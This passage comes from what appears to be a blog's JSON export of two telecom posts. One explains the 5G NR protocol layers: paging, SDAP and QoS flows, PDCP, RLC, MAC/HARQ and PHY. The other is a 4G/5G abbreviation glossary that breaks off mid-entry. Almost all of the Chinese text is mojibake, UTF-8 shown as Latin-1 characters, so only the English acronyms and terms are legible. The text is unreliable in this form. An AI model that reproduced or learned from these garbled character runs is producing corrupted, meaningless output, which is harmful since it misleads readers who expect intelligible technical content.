1.å‘ç”ŸRANå¯»å‘¼è§¦å‘äº‹ä»¶ï¼ˆæ”¶åˆ°ä¸‹è¡Œç”¨æˆ·é¢æ•°æ®ï¼Œæ¥è‡ª5GCçš„ä¸‹è¡Œä¿¡ä»¤ç­‰ï¼‰ 2.è§¦å‘RANå¯»å‘¼ï¼Œå¯»å‘¼èŒƒå›´æ˜¯RNA 3.ä½¿ç”¨ I-RNTIå¯»å‘¼UE 4.å¦‚æœUEè¢«å¯»å‘¼åˆ°ï¼Œåˆ™åç»­æµç¨‹åŒä¸Šé¢çš„â€œUEå‘èµ·ï¼šUEè§¦å‘ä»RRC_INACTIVEåˆ°RRC_CONNECTEDçš„è½¬æ¢â€ ä¸‰ã€SDAPå±‚ (Service Data Adaptation Protocol,æœåŠ¡æ•°æ®é€‚é…åè®®å±‚)å±äºå±‚äºŒï¼Œåªå­˜åœ¨äºç”¨æˆ·é¢ï¼Œä½äºPDCPå±‚ä»¥ä¸Šï¼Œç›´æ¥æ‰¿è½½IPæ•°æ®åŒ…ã€‚ è´Ÿè´£QoSæµä¸DRBï¼ˆæ•°æ®æ— çº¿æ‰¿è½½ï¼‰ä¹‹é—´çš„æ˜ å°„ ä¸ºæ•°æ®åŒ…æ·»åŠ QFIï¼ˆQoS flow IDï¼‰æ ‡è¯† ï¼ˆä¸€ï¼‰ã€æ‰¿è½½ â— 4GåŸºäºEPSæ‰¿è½½ â— ç‰¹ç‚¹ï¼š QoSæ§åˆ¶çš„åŸºæœ¬ç²’åº¦æ˜¯EPSæ‰¿è½½(Bearer)ï¼› éœ€è¦é€šè¿‡å»ºç«‹å¤šä¸ªä¸“ç”¨æ‰¿è½½ä¸ºUEæä¾›å…·æœ‰ä¸åŒQoSä¿éšœçš„ä¸šåŠ¡ã€‚ â— å±€é™ï¼š LTE QoSæœºåˆ¶æ›´é€‚ç”¨äºè¿è¥å•†å†…éƒ¨åº”ç”¨ï¼› åŸºäºæ‰¿è½½çš„QoSç®¡ç†æœºåˆ¶ç²’åº¦è¾ƒç²—ï¼Œæ— æ³•å®ç°ä¸šåŠ¡æµç²’åº¦çš„QoSæ§åˆ¶ï¼› æ‰¿è½½å»ºç«‹ä¿¡ä»¤å¼€é”€å¤§ã€è¾ƒæ…¢ï¼Œæ— æ³•è·Ÿè¸ªTCP sessionå˜åŒ–ã€‚ â— 5Gæ‰¿è½½åŸºäºQoSæ¶æ„ï¼š 5GCä¼šä¸ºæ¯ä¸ªUEå»ºç«‹ä¸€ä¸ªæˆ–å¤šä¸ªPDUï¼ˆåè®®æ•°æ®å•å…ƒï¼‰ä¼šè¯ï¼ˆPDU sessionï¼‰ï¼ŒPDUä¼šè¯å¯èƒ½ä¼šå»ºç«‹ä¸€ä¸ªæˆ–å¤šä¸ªQoSæµï¼ŒNG-RANä¼šä¸ºæ‹¥æœ‰ä¸åŒéœ€æ±‚çš„QoSæµå»ºç«‹ä¸åŒçš„DRBï¼Œæˆ–å°†å±äºåŒä¸€PDUä¼šè¯çš„å¤šä¸ªQoSæµæ˜ å°„åˆ°åŒä¸€ä¸ªDRBä¸Š â— 5G QoSæ¨¡å‹åŸºäºQoSæµï¼ŒQoSæµæ˜¯PDUä¼šè¯å†…åŒºåˆ†QoSå·®å¼‚çš„æœ€ä½³ç²’åº¦ï¼Œå¹¶ä¸”ç”±QoSæµIDï¼ˆQFIï¼‰å”¯ä¸€æ ‡è®°ï¼Œæ¯ä¸ªQoSæµéƒ½æŠŠå…¶ç›¸å…³è”çš„QoSå±æ€§è¿›è¡Œé›†åˆã€‚ â— ä¸€ä¸ªQoSè§„åˆ™åŒ…å«ï¼šå…³è”çš„QoSæµçš„QFIã€æ•°æ®åŒ…è¿‡æ»¤å™¨é›†ï¼ˆä¸€ä¸ªè¿‡æ»¤å™¨åˆ—è¡¨ï¼‰ã€ä¼˜å…ˆçº§ã€‚ä¸€ä¸ªQoSæµå¯ä»¥æœ‰å¤šä¸ªQoSè§„åˆ™ã€‚ â— UEå’ŒUPFï¼ˆç”¨æˆ·å¹³é¢åŠŸèƒ½ï¼‰é€šè¿‡Packet Filter Setå°†ä¸šåŠ¡å’ŒQoSæµå…³è”ï¼ŒRANä¾§å°†QoSæµæ˜ å°„åˆ°DRBä¸Šï¼Œæ¥ç¡®ä¿æœåŠ¡çš„è´¨é‡ â— 5G QoS æ¶æ„åªç”¨äºSAç»„ç½‘ â— ä¸€ä¸ªQoSæµçš„QoSé…ç½®åŒ…å«çš„QoSå‚æ•°å¦‚ä¸‹ï¼š æ¯æ¡GBR QoSæµçš„QoSé…ç½®å¯èƒ½è¿˜ä¼šåŒ…å«ï¼šæŒ‡ç¤ºæ§åˆ¶ã€æœ€å¤§ä¸¢åŒ…ç‡ã€‚ æ¯æ¡GBR QoSæµçš„QoSé…ç½®è¿˜ä¼šåŒ…å«å‚æ•°ï¼šä¿è¯æµæ¯”ç‰¹ç‡(GFBR)ã€æœ€å¤§æµæ¯”ç‰¹ç‡(MFBR)ã€AMBRï¼ˆAggregate Maximum Bit Rateï¼Œç”¨æ¥é’³åˆ¶Non GBRæ€»å¸¦å®½ï¼‰ã€‚ æ¯æ¡Non-GBR QoSæµçš„QoSé…ç½®å¯èƒ½è¿˜ä¼šåŒ…å«å‚æ•°ï¼šåå°„QoSå±æ€§ï¼ˆRQAï¼‰ã€‚ æ¯æ¡QoSæµçš„QoSé…ç½®éƒ½ä¼šåŒ…å«çš„QoSå‚æ•°ï¼š5QIï¼ˆå®šä¹‰QoSç­‰çº§ï¼šæ—¶å»¶ã€è¯¯å—ã€ä¼˜å…ˆçº§ï¼‰ã€ARPã€‚ ï¼ˆäºŒï¼‰ã€SDAPå±‚å¤„ç†æµç¨‹ æ˜¯å¦æ·»åŠ SDAPå¤´å–å†³äºUEä¸Šè¡Œçš„QoSæµçš„æ˜ å°„æ–¹æ³•ï¼Œå¦‚æœé‡‡ç”¨åå°„å¼æ˜ å°„ï¼Œåˆ™gNBå¿…é¡»æ·»åŠ SDAPå¤´ï¼Œç”¨äºæ ‡è¯†è¯¥æ•°æ®åŒ…çš„QoSæµã€‚è‹¥æœé‡‡ç”¨åŸºäºé…ç½®çš„æ˜ å°„ï¼Œåˆ™gNBæ— éœ€æ·»åŠ SDAPåŒ…å¤´ å››ã€PDCPå±‚ æ•°æ®åˆ†æµçš„èŠ‚ç‚¹ï¼›Cloud RANä¸­CU,DUåˆ†ç¦»çš„èŠ‚ç‚¹ ï¼ˆä¸€ï¼‰ã€åŠŸèƒ½ â— LTEåŸæœ‰ ä¼ è¾“ç”¨æˆ·é¢å’Œæ§åˆ¶é¢æ•°æ® ç»´æŠ¤PDCPçš„SNå· åŠ å¯†/è§£å¯†å’Œå®Œæ•´æ€§ä¿æŠ¤ï¼ˆ5Gï¼šç”¨æˆ·é¢å’Œæ§åˆ¶é¢ï¼›4Gï¼šä»…æ§åˆ¶é¢ ï¼‰ é‡å¤ä¸¢å¼ƒ RoHCå¤´å‹ç¼©ï¼ˆç”¨æˆ·é¢ï¼Œéœ€åŸºç«™å’ŒUEå‡æ”¯æŒï¼‰ â— NRæ–°å¢ è·¯ç”±å’Œé‡å¤ï¼ˆåŒè¿æ¥åœºæ™¯æ—¶ï¼‰ é‡æ’åºï¼ˆä»RLCå±‚ç§»è‡³PDCPå±‚ï¼‰ æ”¯æŒä¹±åºé€’äº¤ ï¼ˆäºŒï¼‰ã€å‚æ•° â— åœ¨RoHCçš„æ¡†æ¶ä¸‹ï¼Œé’ˆå¯¹ä¸åŒåè®®çš„æ•°æ®æµï¼Œæœ‰ä¸åŒçš„å¤´éƒ¨å‹ç¼©ç®—æ³•ã€‚5G RFCå®šä¹‰äº†å¦‚ä¸‹ä¸€äº›Profileç”¨äºRoHCå‹ç¼© â— RoHCï¼ˆRObust Header Compression)æ˜¯ä¸€ç§ä¸“ä¸ºæ— é™è¿è·¯è®¾è®¡çš„æ•°æ®åŒ…å¤´å‹ç¼©æœºåˆ¶ï¼Œä»¥é€‚åº”æ— çº¿é“¾è·¯é«˜è¯¯ç ç‡å’Œé•¿ç¯å›æ—¶é—´çš„é“¾è·¯ç‰¹æ€§ã€‚ å¯é æ€§é«˜ï¼šç”±äºRoHCæä¾›äº†åé¦ˆæœºåˆ¶ï¼Œå› æ­¤å®ƒåœ¨é«˜è¯¯ç é«˜æ—¶å»¶ä¸œæ— çº¿é“¾è·¯ä¸­å…·æœ‰æ›´é«˜çš„å¯é æ€§ å‹ç¼©æ•ˆç‡é«˜ï¼šæœ€å°å¯å°†åŒ…å¤´å‹ç¼©æˆ1ä¸ªå­—èŠ‚ â— å®‰å…¨æµç¨‹ç®—æ³• NIA0/NEA0ï¼šä¸è¿›è¡Œå®Œæ•´æ€§ä¿æŠ¤ 128-NIA1/NEA1ï¼š128-bit SNOW 3G æ¬§æ´² 128-NIA2/NEA2ï¼š128-bit AES ç¾å›½ 128-NIA3/NEA3ï¼š128-bit ZUC ä¸­å›½ äº”ã€RLCå±‚ ä½äºPDCPå±‚ä»¥ä¸‹ å®ä½“åˆ†ä¸ºTMå®ä½“ã€UMå®ä½“ã€AMå®ä½“ï¼ŒAMæ•°æ®æ”¶å‘å…±ç”¨ä¸€ä¸ªå®ä½“ï¼ŒUMå’ŒTMæ”¶å‘å®ä½“åˆ†å¼€ ä¸åŒäºLTEï¼ŒNR RLCå±‚ç»„è£…RLCå±‚PDUæ—¶ï¼Œä¸éœ€è¦åº•å±‚MACé€šçŸ¥æ˜¯å¦æœ‰å‘é€æœºä¼šï¼Œå¯å…ˆè¡Œå°è£…PDUåŒ…ï¼ŒRLCä¹Ÿæ²¡æœ‰ä¸²è”åŠŸèƒ½ï¼ˆä¸‹ç§»åˆ°MACå±‚ï¼‰ï¼Œä½†RLC PDUè¦çœŸæ­£å‘é€å‡ºå»åŒæ ·éœ€è¦ç­‰å¾…MACå±‚æŒ‡ç¤º ï¼ˆä¸€ï¼‰ã€å®ä½“ TMï¼šé€ä¼ ï¼Œä¸åšä»»ä½•å¤„ç† AMï¼šç¡®è®¤ï¼Œéœ€è¦ACK/NACK UMï¼šéç¡®è®¤ï¼Œæ²¡æœ‰çº é”™æœºåˆ¶ï¼Œæ—¶å»¶ä½ï¼ˆVoIPä¸šåŠ¡ï¼‰ ï¼ˆäºŒï¼‰ã€åŠŸèƒ½ æ£€é”™ã€çº é”™ARQï¼ˆAMï¼‰ åˆ†æ®µé‡ç»„ï¼ˆUM,AMï¼‰ é‡åˆ†æ®µï¼ˆAMï¼‰ é‡å¤åŒ…æ£€æµ‹ï¼ˆAMï¼‰ å–æ¶ˆäº†ä¸²è”åŠŸèƒ½ â— å…­ã€MACå±‚ MACå±‚ç”¨äºé€»è¾‘ä¿¡é“åˆ°ä¼ è¾“ä¿¡é“çš„æ˜ å°„ UEå’ŒåŸºç«™ä¾§éƒ½æœ‰MACå±‚å®ä½“,ä½†å­˜åœ¨DCï¼ˆåŒè¿æ¥ï¼‰æ—¶ï¼Œç»ˆç«¯åˆ™ä¼šå­˜åœ¨å¤šä¸ªMACå®ä½“ â— è°ƒåº¦ å…³é”®åŠŸèƒ½ â— UEè°ƒåº¦è¯·æ±‚ PRACHï¼šå½“æ‰‹æœºç©ºå£IDELæ€ SR-PUCCHï¼šRRCé“¾æ¥è¿˜åœ¨ï¼Œåªæ˜¯æ²¡æœ‰ä¸Šè¡Œèµ„æº â— gNBæˆæƒ â— UEçŠ¶æ€æŠ¥å‘Š â— gNBä¸Šä¸‹è¡Œè°ƒåº¦PDCCH â— UEè§£æ—¶é¢‘èµ„æºä½ç½®ï¼Œæ•°æ®ä¼ è¾“ï¼ŒHARQ â— é€»è¾‘ä¿¡é“å’Œä¼ è¾“ä¿¡é“ä¹‹é—´çš„æ˜ å°„ï¼ˆä¿¡é“çš„å¤ç”¨å’Œè§£å¤ç”¨ï¼‰ â— HARQæ§åˆ¶ åŒæ­¥HARQï¼šä¸€ä¸ªHARQè¿›ç¨‹å‘ç”Ÿåœ¨å›ºå®šçš„æ—¶åˆ»ï¼Œæ¥æ”¶ç«¯é¢„å…ˆçŸ¥é“é‡ä¼ çš„æ—¶åˆ»ã€‚ å¼‚æ­¥HARQï¼šä¸€ä¸ªHARQè¿›ç¨‹å¯ä»¥å‘ç”Ÿåœ¨ä»»ä½•æ—¶åˆ»ï¼Œæ¥æ”¶ç«¯é¢„å…ˆä¸çŸ¥é“é‡ä¼ çš„æ—¶åˆ» æ ¹æ®é‡ä¼ çš„æ•°æ®ç‰¹å¾æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼ˆé‡ä¼ çš„MCSä¸åˆå§‹çš„ä¸€è‡´ä¸ºéè‡ªé€‚åº”ï¼Œä¸ä¸€æ ·åˆ™ä¸ºè‡ªé€‚åº”ï¼‰ï¼Œå¯ä»¥åˆ†ä¸ºè‡ªé€‚åº”å’Œéè‡ªé€‚åº”ã€‚ç›®å‰NRä¸Šä¸‹è¡Œå…¨éƒ¨é‡‡ç”¨å¼‚æ­¥è‡ªé€‚åº”é‡ä¼ ã€‚ ï¼ˆ1ï¼‰ä¸Šè¡Œé‡‡ç”¨å¼‚æ­¥è‡ªé€‚åº”çš„HARQ,åŸºç«™ä¾§ä¸éœ€è¦åé¦ˆACK/NACK,æ‰€ä»¥5Gå–æ¶ˆäº†PHICH,èŠ‚çœäº†ä¿¡é“èµ„æºã€‚åœ¨ä¸‹æ¬¡è°ƒåº¦æ—¶ï¼Œé€šè¿‡NDIï¼ˆæ–°è€æ•°æ®æŒ‡ç¤ºï¼Œ0ä¸ºé‡ä¼ ï¼Œ1ä¸ºåˆä¼ ï¼‰å­—æ®µï¼Œé—´æ¥é€šçŸ¥UEä¸Šè¡Œæ•°æ®è§£è°ƒæ˜¯å¦æˆåŠŸã€‚ ï¼ˆ2ï¼‰ä¸‹è¡Œé‡‡ç”¨å¼‚æ­¥è‡ªé€‚åº”çš„HARQï¼Œéœ€è¦æŒ‡ç¤ºUEåé¦ˆACK/NACKçš„æ—¶åŸŸä½ç½® â— é€»è¾‘ä¿¡é“ä¼˜å…ˆçº§æ§åˆ¶ ä¸ƒã€PHYå±‚ ï¼ˆä¸€ï¼‰ã€ç‰©ç†å±‚å¤„ç†æµç¨‹ ç‰©ç†å±‚æ˜¯ç©ºå£åè®®æ ˆæœ€å¤æ‚çš„ä¸€å±‚ï¼Œå¦‚å›¾æ‰€ç¤ºçš„æ˜¯ç‰©ç†å±‚çš„å…¸å‹æµç¨‹ï¼Œä½†ä¸åŒä¿¡é“çš„å¤„ç†è¿‡ç¨‹ä¼šæœ‰æ‰€å˜åŒ–ã€‚ TBï¼ˆTransport Blockï¼Œä¼ è¾“å—ï¼‰ï¼š1ä¸ªTBåŒ…å«1ä¸ªMAC PDUçš„æ•°æ®å— CWï¼ˆCode Wordï¼Œç å­—ï¼‰ï¼šé¦–å…ˆå¯¹æ¯ä¸ªTBæ·»åŠ CRCï¼Œç„¶åè¿›è¡Œç å—åˆ†æ®µç”Ÿæˆè‹¥å¹²CBï¼ˆCode Blockï¼Œç å—ï¼‰ï¼Œå¯¹æ¯ä¸ªç å—å¢åŠ CRCã€ä¿¡é“ç¼–ç ã€é€Ÿç‡åŒ¹é…ä¹‹åï¼Œå¾—åˆ°ç å­— å±‚ï¼šä¹Ÿå°±æ˜¯æµï¼Œç å­—é€šè¿‡å±‚æ˜ å°„åˆ°ä¸åŒçš„æµä¸Šï¼Œå®ç°ä¸²è¡Œåˆ°å¹¶è¡Œçš„è½¬æ¢ã€‚æµè¶Šå¤šï¼Œé€Ÿç‡å°±ä¼šè¶Šé«˜ã€‚ è°ƒåˆ¶ï¼šæ›´é«˜é˜¶çš„è°ƒåˆ¶æ–¹å¼ä½¿æ¯ç¬¦å·æºå¸¦çš„æ¯”ç‰¹æ•°æ›´å¤§ï¼Œä»è€Œå®ç°æ›´é«˜çš„ä¼ è¾“é€Ÿç‡ã€‚ å¤©çº¿ç«¯å£ï¼šå¤©çº¿çš„é€»è¾‘ç«¯å£ï¼Œæ¯ä¸ªç«¯å£å·ä¸Šæœ‰è‡ªå·±ç‹¬ç«‹çš„DMRSä¿¡å·ã€‚å–ä»£äº†LTEä¸­CRSå‚è€ƒä¿¡å·ï¼ŒèŠ‚çœäº†åŠŸç‡çš„å¼€é”€ï¼Œç¼“è§£äº†MOD 3å¹²æ‰°ã€‚ ç¼–ç ï¼šeMBBåœºæ™¯ï¼Œæ§åˆ¶ä¿¡é“ä½¿ç”¨Polarç ç¼–ç ï¼Œä¸šåŠ¡ä¿¡é“ä½¿ç”¨LDPCç ç¼–ç  å±‚æ˜ å°„ï¼šæŠŠç å­—æ˜ å°„åˆ°å¤šä¸ªå±‚å¹¶è¡Œå‘é€çš„è¿‡ç¨‹ é¢„ç¼–ç ï¼šç»è¿‡åŠ æƒï¼Œä½¿æ•°æ®æµæ˜ å°„åˆ°å¤©çº¿ç«¯å£ æ³¢æŸï¼šå„å±‚æ•°æ®é€šè¿‡èµ‹å‹åŠ æƒåæ˜ å°„åˆ°å¤©çº¿ä¸Šå‘é€ï¼Œåœ¨æƒå€¼çš„ä½œç”¨ä¸‹ï¼Œæ³¢æŸæŒ‡å‘UEã€‚æ³¢æŸçš„ä¸ªæ•°ä¸æµçš„ä¸ªæ•°ç›¸åŒã€‚ ï¼ˆäºŒï¼‰ã€å‡†å…±å€ï¼ˆQCL,Quasi Co-Location) â— åŠŸèƒ½ï¼š5Gæ•°æ®é€šè¿‡æ³¢æŸçš„æ–¹å¼å‘é€ï¼Œæ¯ä¸ªä¿¡é“åœ¨ç©ºå£çš„æ³¢æŸä¸Šå¦‚ä½•å‘é€å†™ä¸€ç§æ²¡æœ‰å®šä¹‰ï¼Œç»ˆç«¯é€šè¿‡ä¸¤ä¸ªä¿¡å·çš„QCLå…³ç³»å¯ä»¥ä»æŸå·²çŸ¥ä¿¡å·çš„ä¼ æ’­ç‰¹å¾ä¸­æ¨å¯¼å‡ºæœªçŸ¥ä¿¡å·çš„ä¼ æ’­ç‰¹å¾ï¼Œè¿›è€Œæé«˜ç»ˆç«¯å¯¹æœªçŸ¥ä¿¡é“çš„è§£è°ƒèƒ½åŠ›ã€‚ â— QCLç±»å‹ï¼šç”±äºä¸åŒä¿¡å·çš„æ³¢æŸå‘é€æ–¹å¼ä¸åŒï¼Œç‰¹æ€§å¯èƒ½å­˜åœ¨å·®å¼‚ï¼Œæ‰€ä»¥æœ‰QCLç±»å‹ä¹‹åˆ†ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"LTE","slug":"æŠ€æœ¯å‘/LTE","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/LTE/"}],"tags":[{"name":"LTE","slug":"LTE","permalink":"https://www.sizaif.com/tags/LTE/"},{"name":"5G","slug":"5G","permalink":"https://www.sizaif.com/tags/5G/"},{"name":"[object Object]","slug":"object-Object","permalink":"https://www.sizaif.com/tags/object-Object/"}],"author":"sizaif"},{"title":"4G&5Gç¼©å†™è¯å®šä¹‰","slug":"4G-5Gç¼©å†™è¯å®šä¹‰","date":"2021-11-13T09:07:17.000Z","updated":"2021-11-13T09:54:30.888Z","comments":true,"path":"posts/cdc9cc72/","link":"","permalink":"https://www.sizaif.com/posts/cdc9cc72/","excerpt":"","text":"ç¼©å†™ å…¨ç§° è§£é‡Š 4G-GUTI 4G-Globally Unique Temporary Identifier 4G-å…¨çƒå”¯ä¸€ä¸´æ—¶æ ‡è¯†ç¬¦ 5GCN 5G Core Network 5Gæ ¸å¿ƒç½‘ç»œ 5G-GUTI 5G-Globally Unique Temporary Identifier 5G-å…¨çƒå”¯ä¸€ä¸´æ—¶æ ‡è¯†ç¬¦ 5GMM 5GS Mobility Management 5GSç§»åŠ¨ç®¡ç† 5G-RG 5G Residential Gateway 5Gä½å®…ç½‘å…³ 5G-BRG 5G Broadband Residential Gateway 5Gå®½å¸¦ä½å®…ç½‘å…³ 5G-CRG 5G Cable Residential Gateway 5Gæœ‰çº¿ä½å®…ç½‘å…³ 5GS 5G System 5Gç³»ç»Ÿ 5GSM 5GS Session Management 5Gä¼šè¯ç®¡ç† 5G-S-TMSI 5G S-Temporary Mobile Subscription Identifier 5G S-ä¸´æ—¶ç§»åŠ¨è®¢é˜…æ ‡è¯†ç¬¦ 5G-TMSI 5G Temporary Mobile Subscription Identifier 5G ä¸´æ—¶ç§»åŠ¨è®¢é˜…æ ‡è¯†ç¬¦ 5QI 5G QoS Identifier 5G QoS æ ‡è¯†ç¬¦ ACS Auto-Configuration Server è‡ªåŠ¨é…ç½®æœåŠ¡å™¨ AKA Authentication and Key Agreement èº«ä»½éªŒè¯å’Œå¯†é’¥åè®® AKMA Authentication and Key Management for Applications åº”ç”¨ç¨‹åºçš„ AKMA èº«ä»½éªŒè¯å’Œå¯†é’¥ç®¡ç† A-KID AKMA Key Identifier AKMA å¯†é’¥æ ‡è¯†ç¬¦ A-TID AKMA Temporary Identifier AKMA ä¸´æ—¶æ ‡è¯†ç¬¦ AMBR Aggregate Maximum Bit Rate èšåˆæœ€å¤§æ¯”ç‰¹ç‡ AMF Access and Mobility Management Function è®¿é—®å’Œç§»åŠ¨ç®¡ç†åŠŸèƒ½ APN Access Point Name æ¥å…¥ç‚¹åç§° ATSSS Access Traffic Steering, Switching and Splitting æ¥å…¥æµé‡è½¬å‘ã€åˆ‡æ¢å’Œåˆ†æµ AUSF Authentication Server Function è®¤è¯æœåŠ¡å™¨åŠŸèƒ½ CAG Closed access group å°é—­è®¿é—®ç»„ CHAP Challenge Handshake Authentication Protocol è´¨è¯¢æ¡æ‰‹è®¤è¯åè®® DDX Downlink Data Expected é¢„æœŸ DDX ä¸‹è¡Œæ•°æ® DL Downlink ä¸‹è¡Œé“¾è·¯ DN Data Network æ•°æ®ç½‘ç»œ DNN Data Network Name æ•°æ®ç½‘ç»œåç§° DNS Domain Name System åŸŸåç³»ç»Ÿ eDRX Extended DRX cycle æ‰©å±• DRX å‘¨æœŸ DS-TT Device-Side TSN Translator è®¾å¤‡ç«¯ TSN è½¬æ¢å™¨ EUI Extended Unique Identifier æ‰©å±•å”¯ä¸€æ ‡è¯†ç¬¦ E-UTRAN Evolved Universal Terrestrial Radio Access Network æ¼”è¿›çš„é€šç”¨é™†åœ°æ— çº¿æ¥å…¥ç½‘ç»œ EAC Early Admission Control æ—©æœŸè¿›å…¥æ§åˆ¶ EAP-AKAâ€™ Improved Extensible Authentication Protocol method for 3rd generation Authentication and Key Agreement ç”¨äºç¬¬ä¸‰ä»£èº«ä»½éªŒè¯å’Œå¯†é’¥åè®®çš„æ”¹è¿›çš„å¯æ‰©å±•èº«ä»½éªŒè¯åè®®æ–¹æ³• EAS Edge Application Server è¾¹ç¼˜åº”ç”¨æœåŠ¡å™¨ EASDF Edge Application Server Discovery Function è¾¹ç¼˜åº”ç”¨æœåŠ¡å™¨å‘ç°åŠŸèƒ½ ECIES Elliptic Curve Integrated Encryption Scheme æ¤­åœ†æ›²çº¿é›†æˆåŠ å¯†æ–¹æ¡ˆ ECS Edge Configuration Server è¾¹ç¼˜é…ç½®æœåŠ¡å™¨ EEC Edge Enabler Client Edge Enabler å®¢æˆ·ç«¯ EPD Extended Protocol Discriminator EPD æ‰©å±•åè®®é‰´åˆ«å™¨ EMM EPS Mobility Management EPS ç§»åŠ¨æ€§ç®¡ç† EPC Evolved Packet Core Network æ¼”è¿›åˆ†ç»„æ ¸å¿ƒç½‘ EPS Evolved Packet System æ¼”è¿›åˆ†ç»„ç³»ç»Ÿ ESM EPS Session Management EPS ä¼šè¯ç®¡ç† FN-RG Fixed Network RG å›ºç½‘RG FN-BRG Fixed Network Broadband RG å›ºç½‘å®½å¸¦RG FN-CRG Fixed Network Cable RG å›ºç½‘ç”µç¼† RG Gbps Gigabits per second åƒå…†ä½æ¯ç§’ GFBR Guaranteed Flow Bit Rate ä¿è¯æµè§ˆæ¯”ç‰¹ç‡ GUAMI Globally Unique AMF Identifier å…¨çƒå”¯ä¸€ AMF æ ‡è¯†ç¬¦ IAB Integrated access and backhaul é›†æˆæ¥å…¥å’Œå›ä¼  IMEI International Mobile station Equipment Identity å›½é™…ç§»åŠ¨å°è®¾å¤‡æ ‡è¯† IMEISV International Mobile station Equipment Identity and Software Version number IMEISV å›½é™…ç§»åŠ¨å°è®¾å¤‡æ ‡è¯†å’Œè½¯ä»¶ç‰ˆæœ¬å· IMSI International Mobile Subscriber Identity å›½é™…ç§»åŠ¨ç”¨æˆ·èº«ä»½ IP-CAN IP-Connectivity Access Network IP-è¿é€šæ€§æ¥å…¥ç½‘ç»œ KSI Key Set Identifier å¯†é’¥é›†æ ‡è¯†ç¬¦ LADN Local Area Data Network å±€åŸŸç½‘æ•°æ®ç½‘ç»œ LCS LoCation Services ä½ç½®æœåŠ¡ LMF Location Management Function ä½ç½®ç®¡ç†åŠŸèƒ½ LPP LTE Positioning Protocol LTE å®šä½åè®® MAC Message Authentication Code æ¶ˆæ¯è®¤è¯ç  MA PDU Multi-Access PDU å¤šè·¯è®¿é—® PDU Mbps Megabits per second å…†æ¯”ç‰¹æ¯ç§’ MFBR Maximum Flow Bit Rate æœ€å¤§æµæ¯”ç‰¹ç‡ MICO Mobile Initiated Connection Only ä»…é™ MICO Mobile å‘èµ·çš„è¿æ¥ MUSIM Multi-USIM å¤šUSIM N3IWF Non-3GPP Inter-Working Function é 3GPP äº’é€šåŠŸèƒ½ N5CW Non-5G-Capable over WLAN ä¸æ”¯æŒ 5G çš„ WLAN N5GC Non-5G Capable é 5G èƒ½åŠ› NAI Network Access Identifier ç½‘ç»œè®¿é—®æ ‡è¯†ç¬¦ NITZ Network Identity and Time Zone ç½‘ç»œèº«ä»½å’Œæ—¶åŒº NR New Radio æ–°æ— çº¿ç”µ ngKSI Key Set Identifier for Next Generation Radio Access Network ä¸‹ä¸€ä»£æ— çº¿æ¥å…¥ç½‘ç»œçš„ ngKSI å¯†é’¥é›†æ ‡è¯†ç¬¦ NPN Non-public network éå…¬ç½‘ NSAC Network Slice Admission Control ç½‘ç»œåˆ‡ç‰‡å‡†å…¥æ§åˆ¶ NSACF Network Slice Admission Control FunctionNSSAA Network slice-specific authentication and authorization ç½‘ç»œåˆ‡ç‰‡å‡†å…¥æ§åˆ¶åŠŸèƒ½NSSAA ç½‘ç»œåˆ‡ç‰‡ä¸“ç”¨è®¤è¯æˆæƒ NSSAAF NSSAA Function NSSAA åŠŸèƒ½ NSSAI Network Slice Selection Assistance Information ç½‘ç»œåˆ‡ç‰‡é€‰æ‹©è¾…åŠ©ä¿¡æ¯ OS Operating System æ“ä½œç³»ç»Ÿ OS Id OS Identity æ“ä½œç³»ç»Ÿ ID æ“ä½œç³»ç»Ÿèº«ä»½ PAP Password Authentication Protocol å¯†ç è®¤è¯åè®® PCO Protocol Configuration Option åè®®é…ç½®é€‰é¡¹ PEI Permanent Equipment Identifier æ°¸ä¹…è®¾å¤‡æ ‡è¯†ç¬¦ PNI-NPN Public Network Integrated Non-Public Network å…¬ç½‘ç»¼åˆéå…¬ç½‘ ProSe Proximity based Services å°±è¿‘æœåŠ¡ ProSeP 5G ProSe policy 5G ProSe æ”¿ç­– PTI Procedure Transaction Identity ç¨‹åºäº‹åŠ¡æ ‡è¯† PVS Provisioning Server ä¾›åº”æœåŠ¡å™¨ QFI QoS Flow Identifier QoS æµæ ‡è¯†ç¬¦ QoS Quality of Service QoS æœåŠ¡è´¨é‡ QRI QoS Rule Identifier QoS è§„åˆ™æ ‡è¯†ç¬¦ RACS Radio Capability Signalling Optimisation æ— çº¿ç”µèƒ½åŠ›ä¿¡ä»¤ä¼˜åŒ– Â®AN (Radio) Access Network æ— çº¿ç”µæ¥å…¥ç½‘ç»œ RFSP RAT Frequency Selection Priority RAT é¢‘ç‡é€‰æ‹©ä¼˜å…ˆçº§ RG Residential Gateway ä½å®…ç½‘å…³ RPLMN Registered PLMN æ³¨å†Œ PLMN RQA Reflective QoS Attribute åå°„ QoS å±æ€§ RQI Reflective QoS Indication åå°„å¼ QoS æŒ‡ç¤º RSNPN Registered SNPN æ³¨å†Œ SNPN S-NSSAI Single NSSAI å• NSSAI SA Security Association SAå®‰å…¨åä¼š SDF Service Data Flow æœåŠ¡æ•°æ®æµ SMF Session Management Function ä¼šè¯ç®¡ç†åŠŸèƒ½ SGC Service Gap Control æœåŠ¡å·®è·æ§åˆ¶ SNN Serving Network Name æœåŠ¡ç½‘ç»œåç§° SNPN Stand-alone Non-Public Network ç‹¬ç«‹éå…¬ç½‘ SOR Steering of Roaming æ¼«æ¸¸è½¬å‘ SOR-CMCI Steering of Roaming Connected Mode Control Information æ¼«æ¸¸è¿æ¥æ¨¡å¼æ§åˆ¶ä¿¡æ¯çš„ SOR-CMCI è½¬å‘ SUCI Subscription Concealed Identifier è®¢é˜…éšè—æ ‡è¯†ç¬¦ SUPI Subscription Permanent Identifier è®¢é˜…æ°¸ä¹…æ ‡è¯†ç¬¦ TA Tracking Area è¿½è¸ªåŒº TAC Tracking Area Code è¿½è¸ªåŒºå· TAI Tracking Area Identity è·Ÿè¸ªåŒºåŸŸæ ‡è¯† Tbps Terabits per second æ¯ç§’ Tbps å¤ªæ¯”ç‰¹ TNGF Trusted Non-3GPP Gateway Function å¯ä¿¡é 3GPP ç½‘å…³åŠŸèƒ½ TSC Time Sensitive Communication æ—¶é—´æ•æ„Ÿé€šä¿¡ TWIF Trusted WLAN Interworking Function å¯ä¿¡ WLAN äº’é€šåŠŸèƒ½ TSN Time-Sensitive Networking æ—¶é—´æ•æ„Ÿç½‘ç»œ UAS Uncrewed Aerial System æ— 